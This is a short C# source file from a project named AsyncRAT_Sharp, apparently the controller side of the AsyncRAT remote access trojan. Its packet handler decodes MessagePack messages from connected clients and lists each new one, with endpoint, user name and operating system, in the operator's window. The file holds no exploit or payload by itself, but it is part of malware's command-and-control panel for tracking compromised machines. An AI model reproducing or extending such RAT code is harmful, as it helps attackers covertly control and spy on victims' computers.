﻿using AsyncRAT_Sharp.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using System;

namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandlePacket
    {
        public static void Read(Clients client, byte[] data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes(data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "ClientInfo":
                        Program.form1.Invoke((MethodInvoker)delegate ()
                        {
                            client.LV = new ListViewItem();
                            client.LV.Tag = client;
                            client.LV.Text = string.Concat(client.client.RemoteEndPoint.ToString());
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                            Program.form1.listView1.Items.Insert(0, client.LV);
                        });
                    break;                             
            }
        }
    }
}